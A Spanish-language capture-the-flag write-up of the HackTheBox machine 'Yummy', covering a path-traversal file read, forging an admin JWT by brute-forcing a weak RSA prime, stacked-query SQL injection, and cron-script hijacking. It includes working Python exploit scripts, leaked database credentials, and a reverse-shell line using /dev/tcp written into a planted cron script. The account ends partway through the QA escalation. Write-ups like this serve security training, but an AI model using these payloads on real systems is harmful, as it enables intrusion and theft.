@@ -1,0 +1,1080 @@
+---
+title: "Máquina Yummy"
+description: "Resolución de la máquina Yummy de HackTheBox"
+tags: ["AFR", "RSA", "SQLi", "Race Condition", "sudo", "hg", "rsync"]
+categories: ["HackTheBox", "Easy", "Linux"]
+logo: "/assets/writeups/yummy/logo.webp"
+---
+
+En esta máquina encontraremos un sitio de reservas para un restaurante el cual contiene una vulnerabilidad de lectura arbitraria de archivos la cual utilizaremos para obtener acceso como administrador y a una ruta administrativa que es vulnerable a SQLi. Luego de ahí veremos que hacemos para obtener acceso a la máquina y escalar privilegios posteriormente.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos
+
+```bash
+# Nmap 7.95 scan initiated Sat Oct  5 15:01:21 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.129.25.155
+Nmap scan report for 10.129.25.155
+Host is up, received user-set (0.21s latency).
+Scanned at 2024-10-05 15:01:21 -04 for 205s
+Not shown: 57262 closed tcp ports (reset), 8271 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Oct  5 15:04:46 2024 -- 1 IP address (1 host up) scanned in 205.05 seconds
+```
+
+El sitio web `yummy.htb` es de un restaurante:
+
+![Web page](/assets/writeups/yummy/1.png)
+
+Podemos registrarnos e iniciar sesión, lo cual nos dará acceso a un dashboard que nos permite ver puestos que reservamos para fechas específicas
+
+![Dashboard](/assets/writeups/yummy/2.png)
+
+En el botón de "Book a Table" podemos hacer reservas de lo dicho anteriormente, y en el dashboard podremos hacer cosas con la reserva que hemos hecho como descargar un archivo para iCalendar:
+
+![Table](/assets/writeups/yummy/3.png)
+
+El archivo que descargamos contiene lo siguiente:
+
+```bash
+❯ cat Yummy_reservation_20250224_131718.ics 
+BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:ics.py - http://git.io/lLljaA
+BEGIN:VEVENT
+DESCRIPTION:Email: test@example.com\nNumber of People: 1\nMessage: uwu owo
+DTSTART:20250224T000000Z
+SUMMARY:test
+UID:e6d689a0-8e27-4591-bc93-6df4b4cf90a7@e6d6.org
+END:VEVENT
+END:VCALENDAR
+```
+
+A ver que hacemos con esto.
+
+## Intrusión
+
+### administrator - yummy.htb
+
+Si miramos las peticiones que hace el sitio web cuando descargamos el archivo para iCalendar, veremos que envia una petición a `/export/<document>.ics`. Extrañamente si le enviamos una petición luego de haberle enviado la anterior nos dice que ha ocurrido un error y no se arreglará hasta que le volvamos a enviar una petición a `/reminder/<reservation-id>`, lo que implica que probablemente esto esté haciendo algo como eliminar el archivo luego de que el cliente lo haya descargado.
+
+Entonces, sabiendo esto y probando continuamente con el endpoint `/export` a ver si hallamos una vulnerabilidad de lectura arbitraria de archivos nos encontraremos con que efectivamente, presenta una:
+
+```bash
+❯ curl -b "X-AUTH-Token=..." -v http://yummy.htb/reminder/21
+* Host yummy.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.36
+*   Trying 10.10.11.36:80...
+* Connected to yummy.htb (10.10.11.36) port 80
+* using HTTP/1.x
+> GET /reminder/21 HTTP/1.1
+> Host: yummy.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Cookie: X-AUTH-Token=...
+> 
+* Request completely sent off
+< HTTP/1.1 302 Found
+< Content-Length: 277
+< Content-Type: text/html; charset=utf-8
+< Date: Mon, 24 Feb 2025 13:25:57 GMT
+< Location: /export/Yummy_reservation_20250224_132557.ics
+< Server: Caddy
+... [snip]
+❯ curl -b "X-AUTH-Token=..." -v --path-as-is "http://yummy.htb/export/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+* Host yummy.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.36
+*   Trying 10.10.11.36:80...
+* Connected to yummy.htb (10.10.11.36) port 80
+* using HTTP/1.x
+> GET /export/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+> Host: yummy.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Cookie: X-AUTH-Token=...
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Cache-Control: no-cache
+< Content-Disposition: attachment; filename=passwd
+< Content-Length: 2033
+< Content-Type: application/octet-stream
+< Date: Mon, 24 Feb 2025 13:27:04 GMT
+< Etag: "1727686952.3123646-2033-266341517"
+< Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
+< Server: Caddy
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+... [snip]
+```
+
+Sabiendo lo que comenté al principio, para ahorrarnos tiempos vamos a automatizar la explotación de esta vulnerabilidad en un script de Python. Se necesitará tener una cuenta ya creada y ajustarlo según la ID de reservación que se utilizará para explotar la vulnerabilidad.
+
+```python
+import requests
+import sys
+
+file = sys.argv[1]
+uwu = sys.argv[2]
+
+cookie = {"X-AUTH-Token": uwu}
+
+table_data = {
+   "name":"asdasd",
+    "email":"test@testing.com",
+    "phone":"1234567890",
+    "date":"2024-10-05",
+    "time":"16:57",
+    "people":"3",
+    "message":"asd"
+}
+
+def create_table_and_remind():
+    requests.post("http://yummy.htb/book", data=table_data, cookies=cookie, headers={"Content-Type": "application/x-www-form-urlencoded"})
+    resp = requests.get("http://yummy.htb/reminder/21", cookies=cookie, allow_redirects=False)
+    if resp.headers["Location"] != "dashboard":
+        print("Done.")
+
+
+# first, invoke reminder endpoint to download a file
+resp = requests.get("http://yummy.htb/reminder/23", cookies=cookie, allow_redirects=False)
+if resp.headers['Location'] == "/dashboard":
+    print("Creating new table... got deleted")
+    create_table_and_remind();
+
+  # now, invoke the interesting endpoint...
+sess = requests.session()
+get = requests.Request(method="GET", url="http://asd.com", cookies=cookie)
+r = get.prepare()
+r.url = f"http://yummy.htb/export/../../../../../../../../../../../../../../..{file}"
+resp2 = sess.send(r)
+print(resp2.text)
+```
+
+Perfecto, pero ¿y ahora que buscaremos?; viendo como está generada la cookie de `session`, esto parece ser una aplicación web Flask, por lo que apuntando a `/proc/self/cwd/app.py` con el script de arriba deberíamos obtener una parte (o todo) el código fuente de la aplicación, y efectivamente podemos obtenerlo:
+
+```python
+from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
+import tempfile
+import os
+import shutil
+from datetime import datetime, timedelta, timezone
+from urllib.parse import quote
+from ics import Calendar, Event
+from middleware.verification import verify_token
+from config import signature
+import pymysql.cursors
+from pymysql.constants import CLIENT
+import jwt
+import secrets
+import hashlib
+
+app = Flask(__name__, static_url_path='/static')
+temp_dir = ''
+app.secret_key = secrets.token_hex(32)
+
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
+    'database': 'yummy_db',
+    'cursorclass': pymysql.cursors.DictCursor,
+    'client_flag': CLIENT.MULTI_STATEMENTS
+
+}
+
+access_token = ''
+
+@app.route('/login', methods=['GET','POST'])
+def login():
+    global access_token
+    if request.method == 'GET':
+        return render_template('login.html', message=None)
+    elif request.method == 'POST':
+        email = request.json.get('email')
+        password = request.json.get('password')
+        password2 = hashlib.sha256(password.encode()).hexdigest()
+        if not email or not password:
+            return jsonify(message="email or password is missing"), 400
+
+        connection = pymysql.connect(**db_config)
+        try:
+            with connection.cursor() as cursor:
+                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
+                cursor.execute(sql, (email, password2))
+                user = cursor.fetchone()
+                if user:
+                    payload = {
+                        'email': email,
+                        'role': user['role_id'],
+                        'iat': datetime.now(timezone.utc),
+                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
+                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
+                    }
+                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')
+
+                    response = make_response(jsonify(access_token=access_token), 200)
+                    response.set_cookie('X-AUTH-Token', access_token)
+                    return response
+                else:
+                    return jsonify(message="Invalid email or password"), 401
+        finally:
+            connection.close()
+
+@app.route('/logout', methods=['GET'])
+def logout():
+    response = make_response(redirect('/login'))
+    response.set_cookie('X-AUTH-Token', '')
+    return response
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+        if request.method == 'GET':
+            return render_template('register.html', message=None)
+        elif request.method == 'POST':
+            role_id = 'customer_' + secrets.token_hex(4)
+            email = request.json.get('email')
+            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
+            if not email or not password:
+                return jsonify(error="email or password is missing"), 400
+            connection = pymysql.connect(**db_config)
+            try:
+                with connection.cursor() as cursor:
+                    sql = "SELECT * FROM users WHERE email=%s"
+                    cursor.execute(sql, (email,))
+                    existing_user = cursor.fetchone()
+                    if existing_user:
+                        return jsonify(error="Email already exists"), 400
+                    else:
+                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
+                        cursor.execute(sql, (email, password, role_id))
+                        connection.commit()
+                        return jsonify(message="User registered successfully"), 201
+            finally:
+                connection.close()
+
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    return render_template('index.html')
+
+@app.route('/book', methods=['GET', 'POST'])
+def export():
+    if request.method == 'POST':
+        try:
+            name = request.form['name']
+            date = request.form['date']
+            time = request.form['time']
+            email = request.form['email']
+            num_people = request.form['people']
+            message = request.form['message']
+
+            connection = pymysql.connect(**db_config)
+            try:
+                with connection.cursor() as cursor:
+                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
+                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
+                    connection.commit()
+                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')  
+            except Exception as e:
+                print(e)
+            return redirect('/#book-a-table')
+        except ValueError:
+            flash('Error processing your request. Please try again.', 'error')
+    return render_template('index.html')
+
+
+def generate_ics_file(name, date, time, email, num_people, message):
+    global temp_dir
+    temp_dir = tempfile.mkdtemp()
+    current_date_time = datetime.now()
+    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")
+
+    cal = Calendar()
+    event = Event()
+    
+    event.name = name
+    event.begin = datetime.strptime(date, "%Y-%m-%d")
+    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"
+    
+    cal.events.add(event)
+
+    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
+    with open(temp_file_path, 'w') as fp:
+        fp.write(cal.serialize())
+
+    return os.path.basename(temp_file_path)
+
+@app.route('/export/<path:filename>')
+def export_file(filename):
+    validation = validate_login()
+    if validation is None:
+        return redirect(url_for('login'))
+    filepath = os.path.join(temp_dir, filename)
+    if os.path.exists(filepath):
+        content = send_file(filepath, as_attachment=True)
+        shutil.rmtree(temp_dir)
+        return content
+    else:
+        shutil.rmtree(temp_dir)
+        return "File not found", 404
+
+def validate_login():
+    try:
+        (email, current_role), status_code = verify_token()
+        if email and status_code == 200 and current_role == "administrator":
+            return current_role
+        elif email and status_code == 200:
+            return email
+        else:
+            raise Exception("Invalid token")
+    except Exception as e:
+        return None
+
+
+@app.route('/dashboard', methods=['GET', 'POST'])
+def dashboard():
+        validation = validate_login()
+        if validation is None:
+            return redirect(url_for('login'))
+        elif validation == "administrator":
+            return redirect(url_for('admindashboard'))
+ 
+        connection = pymysql.connect(**db_config)
+        try:
+            with connection.cursor() as cursor:
+                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
+                cursor.execute(sql, (validation,))
+                connection.commit()
+                appointments = cursor.fetchall()
+                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])
+
+        finally:
+            connection.close()
+
+        return render_template('dashboard.html', appointments=appointments_sorted)
+
+@app.route('/delete/<appointID>')
+def delete_file(appointID):
+    validation = validate_login()
+    if validation is None:
+        return redirect(url_for('login'))
+    elif validation == "administrator":
+        connection = pymysql.connect(**db_config)
+        try:
+            with connection.cursor() as cursor:
+                sql = "DELETE FROM appointments where appointment_id= %s;"
+                cursor.execute(sql, (appointID,))
+                connection.commit()
+
+                sql = "SELECT * from appointments"
+                cursor.execute(sql)
+                connection.commit()
+                appointments = cursor.fetchall()
+        finally:
+            connection.close()
+            flash("Reservation deleted successfully","success")
+            return redirect(url_for("admindashboard"))
+    else:
+        connection = pymysql.connect(**db_config)
+        try:
+            with connection.cursor() as cursor:
+                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
+                cursor.execute(sql, (appointID, validation))
+                connection.commit()
+
+                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
+                cursor.execute(sql, (validation,))
+                connection.commit()
+                appointments = cursor.fetchall()
+        finally:
+            connection.close()
+            flash("Reservation deleted successfully","success")
+            return redirect(url_for("dashboard"))
+        flash("Something went wrong!","error")
+        return redirect(url_for("dashboard"))
+
+@app.route('/reminder/<appointID>')
+def reminder_file(appointID):
+    validation = validate_login()
+    if validation is None:
+        return redirect(url_for('login'))
+
+    connection = pymysql.connect(**db_config)
+    try:
+        with connection.cursor() as cursor:
+            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
+            result = cursor.execute(sql, (validation, appointID))
+            if result != 0:
+                connection.commit()
+                appointments = cursor.fetchone()
+                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
+                connection.close()
+                flash("Reservation downloaded successfully","success")
+                return redirect(url_for('export_file', filename=filename))
+            else:
+                flash("Something went wrong!","error")
+    except:
+        flash("Something went wrong!","error")
+        
+    return redirect(url_for("dashboard"))
+
+@app.route('/admindashboard', methods=['GET', 'POST'])
+def admindashboard():
+        validation = validate_login()
+        if validation != "administrator":
+            return redirect(url_for('login'))
+ 
+        try:
+            connection = pymysql.connect(**db_config)
+            with connection.cursor() as cursor:
+                sql = "SELECT * from appointments"
+                cursor.execute(sql)
+                connection.commit()
+                appointments = cursor.fetchall()
+
+                search_query = request.args.get('s', '')
+
+                # added option to order the reservations
+                order_query = request.args.get('o', '')
+
+                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
+                cursor.execute(sql, ('%' + search_query + '%',))
+                connection.commit()
+                appointments = cursor.fetchall()
+            connection.close()
+            
+            return render_template('admindashboard.html', appointments=appointments)
+        except Exception as e:
+            flash(str(e), 'error')
+            return render_template('admindashboard.html', appointments=appointments)
+
+
+
+if __name__ == '__main__':
+    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)
+```
+
+Aquí podemos ver como se acontece la vulnerabilidad y además que está utilizando una llave RSA para firmar el JWT de la cookie `X-AUTH-Token`. Parece que en `config/signature.py` está el algoritmo utilizado para generar la llave en cuestión:
+
+```py
+#!/usr/bin/python3
+
+from Crypto.PublicKey import RSA
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+import sympy
+
+
+# Generate RSA key pair
+q = sympy.randprime(2**19, 2**20)
+n = sympy.randprime(2**1023, 2**1024) * q
+e = 65537
+p = n // q
+phi_n = (p - 1) * (q - 1)
+d = pow(e, -1, phi_n)
+key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
+key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
+private_key_bytes = key.export_key()
+
+private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=None,
+    backend=default_backend()
+)
+public_key = private_key.public_key()
+```
+
+Okay... encima de que construir una llave RSA de esa forma es completamente innecesario está utilizando un intérvalo pequeño para encontrar un números primo aleatorio ($$ [524288,1048576] $$) y asignarlo como $$ q $$, y de esto podemos aprovecharnos para hacer fuerza bruta y encontrar dicho número primo sin mucho esfuerzo.
+
+$$ e $$ es una constante, y $$ n $$ está dentro del propio JWT.
+
+```bash
+=====================
+Decoded Token Values:
+=====================
+
+Token header values:
+[+] alg = "RS256"
+[+] typ = "JWT"
+
+Token payload values:
+[+] email = "test@example.com"
+[+] role = "customer_e8ad8105"
+[+] iat = 1740422255    ==> TIMESTAMP = 2025-02-24 14:37:35 (UTC)
+[+] exp = 1740425855    ==> TIMESTAMP = 2025-02-24 15:37:35 (UTC)
+[+] jwk = JSON object:
+    [+] kty = "RSA"
+    [+] n = 131938453883829274212290071938686094449538681554309432794765583856562547417063504151214029708738150838044414313647689548904027990586430514963641171473209812610001491883921983057245831956203216481193877763181314947151545972570982360774570264484002859134365486687169152774162510444893253254797471388778284721729843461
+    [+] e = 65537
+... [snip]
+```
+
+Con esto ya podemos crearnos un script que se encargue de encontrar el número primo $$ p $$ y que nos genere un JWT al mismo tiempo como el usuario administrador:
+
+```py
+from Crypto.PublicKey import RSA
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+import sympy
+from datetime import datetime, timedelta, timezone
+import sys
+import jwt
+
+if len(sys.argv) < 3:
+    print(f"usage: {sys.argv[0]} <token> <n>")
+    exit(1)
+
+token = sys.argv[1]
+n = int(sys.argv[2])
+# uwu owo
+
+while True:
+  try:
+    q = sympy.randprime(2**19, 2**20)
+    e = 65537
+    p = n // q
+    phi_n = (p - 1) * (q - 1)
+    d = pow(e, -1, phi_n)
+    key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
+    key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
+    private_key_bytes = key.export_key()
+
+    private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=None,
+    backend=default_backend()
+)
+    public_key = private_key.public_key()
+    jwt.decode(token, public_key, algorithms=["RS256"])
+    print(f"found q!: {q}")
+
+    payload = {
+        'email': "admin@yummy.htb",
+        'role': "administrator",
+        'iat': datetime.now(timezone.utc),
+        'exp': datetime.now(timezone.utc) + timedelta(seconds=300000),
+        'jwk':{'kty': 'RSA',"n":str(n),"e":e}
+    }
+  
+    thing = jwt.encode(payload, private_key_bytes, algorithm="RS256")
+    print(thing)
+    break
+  except jwt.InvalidSignatureError:
+    pass
+  except jwt.InvalidKeyError:
+    pass
+  except jwt.InvalidTokenError:
+    pass
+  except ValueError:
+    pass
+```
+
+Ejecutándolo con el JWT que sacamos del servidor:
+
+```bash
+❯ python gen_prime.py ... ...
+found q!: 758941
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJlbWFpbCI6ImFkbWluQHl1bW15Lmh0YiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzQwNDI0NDY4LCJleHAiOjE3NDA0MjgwNjgsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTMxOTM4NDUzODgzODI5Mjc0MjEyMjkwMDcxOTM4Njg2MDk0NDQ5NTM4NjgxNTU0MzA5NDMyNzk0NzY1NTgzODU2NTYyNTQ3NDE3MDYzNTA0MTUxMjE0MDI5NzA4NzM4MTUwODM4MDQ0NDE0MzEzNjQ3Njg5NTQ4OTA0MDI3OTkwNTg2NDMwNTE0OTYzNjQxMTcxNDczMjA5ODEyNjEwMDAxNDkxODgzOTIxOTgzMDU3MjQ1ODMxOTU2MjAzMjE2NDgxMTkzODc3NzYzMTgxMzE0OTQ3MTUxNTQ1OTcyNTcwOTgyMzYwNzc0NTcwMjY0NDg0MDAyODU5MTM0MzY1NDg2Njg3MTY5MTUyNzc0MTYyNTEwNDQ0ODkzMjUzMjU0Nzk3NDcxMzg4Nzc4Mjg0NzIxNzI5ODQzNDYxIiwiZSI6NjU1Mzd9fQ.BHzTFL8BEeD4S2rBMweULnSCs_llPz73uu87r81-WxlNACNaKtB8LvdsAwNVYy632AaudR19ufbJdD5sTopiYYezJR7-yoSFcM8gdiW23sikoHmzJCBXFugXytcjNACQM6nw6UNeJTdwCwGVYy1uxFM7cUYOg6xAACmBomJnU8lIFLw
+```
+
+y colocándonos este token como cookie:
+
+![Web admin](/assets/writeups/yummy/4.png)
+
+Tenemos acceso administrativo ahora.
+
+### mysql - yummy
+
+El campo de busqueda de emails se ve vulnerable a inyección SQL en el parámetro de la petición `o`:
+
+![Uh oh](/assets/writeups/yummy/5.png)
+
+En el código de la aplicación que vimos arriba podemos ver la query SQL que se está ejecutando:
+
+```sql
+SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}
+```
+
+Otra cosa estúpida por parte del desarrollador, por supuesto... además de que las opciones del driver de MySQL utilizado puestas por el mismo nos permiten utilizar consultas apiladas por `;`.
+
+Sin embargo, no podemos retornar nada debido al punto en el que está la inyección. Pero por consultas apiladas se puede alterar alguno de los datos ya existentes para poder ver los valores retornados por la consulta:
+
+```bash
+# Las columnas puedes encontrarlas por lógica o inspeccionando el código fuente.
+http://yummy.htb/admindashboard?s=&o=asc;%20UPDATE%20appointments%20SET%20appointment_message=%27uwu%27%20WHERE%20appointment_id=2
+```
+
+![uhhhh](/assets/writeups/yummy/6.png)
+
+Curiosamente, el usuario de MySQL que usa el servidor web para sus cosas puede leer archivos del sistema:
+
+![File read](/assets/writeups/yummy/7.png)
+
+Mirando en el correo de la cuenta del DBMS en `/var/spool/mail/mysql` a ver si tiene notificaciones o algo, podemos encontrar estos correos repetidamente:
+
+```bash
+From mysql@yummy.htb Mon Feb 24 19:45:01 2025 
+Return-Path: <mysql@yummy.htb> 
+X-Original-To: mysql Delivered-To: mysql@yummy.htb 
+Received: by yummy.localdomain (Postfix, from userid 110) id E868340EC1; Mon, 24 Feb 2025 19:45:01 +0000 (UTC) 
+From: root@yummy.htb (Cron Daemon) 
+To: mysql@yummy.htb 
+Subject: Cron <mysql@yummy> /bin/bash /data/scripts/dbmonitor.sh 
+MIME-Version: 1.0 
+Content-Type: text/plain; charset=UTF-8 
+Content-Transfer-Encoding: quoted-printable X-Cron-Env: <SHELL=/bin/sh> 
+X-Cron-Env: <HOME=/nonexistent> 
+X-Cron-Env: <LOGNAME=mysql> 
+Message-Id: <20250224194501.E868340EC1@yummy.localdomain> Date: Mon, 24 Feb 2025 19:45:01 +0000 (UTC) Response is OK.
+```
+
+El archivo marcado, `/data/scripts/dbmonitor.sh` contiene lo siguiente:
+
+```bash
+#!/bin/bash 
+timestamp=$(/usr/bin/date) 
+service=mysql 
+response=$(/usr/bin/systemctl is-active mysql) 
+if [ "$response" != 'active' ]; then 
+     /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json 
+     /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1) 
+     /bin/bash "$latest_version" 
+else 
+    if [ -f /data/scripts/dbstatus.json ]; then 
+        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then 
+            /usr/bin/echo "The database was down at $timestamp. Sending notification." 
+            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root 
+            /usr/bin/rm -f /data/scripts/dbstatus.json 
+        else 
+            /usr/bin/rm -f /data/scripts/dbstatus.json 
+            /usr/bin/echo "The automation failed in some way, attempting to fix it." 
+            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1) 
+            /bin/bash "$latest_version" 
+        fi 
+    else 
+        /usr/bin/echo "Response is OK." 
+    fi 
+fi 
+[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
+```
+{: file="/data/scripts/dbmonitor.sh" }
+
+Básicamente ejecutará cualquier script que comienze con `fixer-v` en la carpeta `/data/scripts` si la base de datos está caida o en un estado inconsistente según el fichero `dbstatus.json`. Sabiendo que tenemos permisos de lectura probablemente tengamos de escritura por igual, por lo que si llegamos a crear los dos ficheros mencionados anteriormente podemos obtener una consola como el usuario `mysql`, ya que es quien está ejecutando la tarea cron en cuestión, pero hay que tener un ojo igualmente ya que puede que exista algún otro fixer ya creado, sin embargo el `sort -V` ordena la lista desde la versión más vieja hasta la más reciente, y el `tail` del final extrae el último elemento. Lo que significa que si tenemos algo así:
+
+```bash
+❯ ls -1
+fixer-v1
+fixer-v2
+```
+
+El script ejecutará la v2.
+
+Ahora, con estos dos archivos:
+
+```bash
+database is pwned
+```
+{: file="dbstatus.json"}
+
+```bash
+bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"
+```
+{: file="fixer-v2"}
+
+y utilizando la instrucción `INTO OUTFILE`, vamos a crearlos dentro del sistema con los nombres y en los directorios especificados anteriormente. Al dejar un netcat en escucha y esperar un ratito obtendremos una consola interactiva:
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.36 58220
+bash: cannot set terminal process group (8880): Inappropriate ioctl for device
+bash: no job control in this shell
+mysql@yummy:/var/spool/cron$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+mysql@yummy:/var/spool/cron$ ^Z
+[1]  + 28631 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg
+[1]  + 28631 continued  nc -lvnp 443
+                                    reset xterm
+mysql@yummy:/var/spool/cron$ export TERM=xterm-256color
+mysql@yummy:/var/spool/cron$ source /etc/skel/.bashrc
+mysql@yummy:/var/spool/cron$ stty rows 34 columns 149
+```
+
+### qa - yummy
+
+Hay otro script que parece ejecutarse automáticamente en la carpeta de scripts:
+
+```bash
+mysql@yummy:/data/scripts$ ls -la
+total 36
+drwxrwxrwx 2 root  root  4096 Feb 24 20:47 .
+drwxr-xr-x 3 root  root  4096 Sep 30 08:16 ..
+-rw-r--r-- 1 root  root    90 Sep 26 15:31 app_backup.sh
+-rw-r--r-- 1 root  root  1336 Sep 26 15:31 dbmonitor.sh
+-rw-r----- 1 root  root    60 Feb 24 20:45 fixer-v1.0.1.sh
+-rw-r----- 1 mysql mysql   51 Feb 24 20:46 fixer-v2
+-rw-r--r-- 1 root  root  5570 Sep 26 15:31 sqlappointments.sql
+-rw-r--r-- 1 root  root   114 Sep 26 15:31 table_cleanup.sh
+```
+
+El `app_backup.sh` lo utiliza `www-data` y se puede comprobar viendo su correo con el AFR que encontramos al principio.
+
+Como tenemos permisos sobre esta carpeta, lo único que tenemos que hacer es simplemente renombrar el archivo, crear uno nosotros y ponerle el mismo nombre inicial del otro script. Pero antes de comprometer a www-data veamos si hay algo interesante por ahí a lo que solamente dicho usuario puede acceder.
+
+En `/var/www` hay algo curioso:
+
+```bash
+mysql@yummy:/data/scripts$ ls -la /var/www
+total 6664
+drwxr-xr-x  3 www-data www-data    4096 Feb 24 20:51 .
+drwxr-xr-x 14 root     root        4096 May 27  2024 ..
+drwxrwx---  7 www-data qa          4096 May 28  2024 app-qatesting
+-rw-rw-r--  1 www-data www-data 6807760 Feb 24 20:51 backupapp.zip
+```
+
+Hay una versión de pruebas para el equipo de QA de este sitio. Solamente www-data y qa pueden verlo, por lo que entonces podemos usar lo que vimos arriba de esto para copiarnos toda esa carpeta en un comprimido y dejarlo en `/tmp` colocando lo siguiente en el archivo `app_backup.sh`, como comenté anteriormente:
+
+```bash
+#!/bin/bash
+
+zip -r /tmp/asd.zip /var/www/app-qatesting 
+```
+{: file="app_backup.sh"}
+
+Como hay un script de limpieza que restaura el archivo original rapidamente, vamos a hacer esto en un solo comando:
+
+```bash
+mv app_backup.sh uwu.sh && echo -e "#"'!'"/bin/bash\n\nzip -r /tmp/asd.zip /var/www/app-qatesting" |tee app_backup.sh
+```
+
+Luego de un momento, tendremos el comprimido dentro de `/tmp`:
+
+```bash
+mysql@yummy:/data/scripts$ ls -la /tmp
+total 13456
+drwxrwxrwt 16 root     root         4096 Feb 24 21:02 .
+drwxr-xr-x 24 root     root         4096 Sep 30 08:16 ..
+-rw-rw-r--  1 www-data www-data 13713276 Feb 24 21:02 asd.zip
+drwxrwxrwt  2 root     root         4096 Feb 24 17:21 .font-unix
+drwxrwxrwt  2 root     root         4096 Feb 24 17:21 .ICE-unix
+drwx------  2 root     root         4096 Feb 24 17:21 snap-private-tmp
+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-caddy.service-baXfRJ
+drwx------  3 root     root         4096 Feb 24 21:02 systemd-private-cc18953525744e65a0a87213250b7daf-fwupd.service-105T3D
+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-ModemManager.service-P5WEDz
+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-polkit.service-hOOyil
+drwx------  3 root     root         4096 Feb 24 17:21 systemd-private-cc18953525744e65a0a87213250b7daf-systemd-logind.service-BewtGr
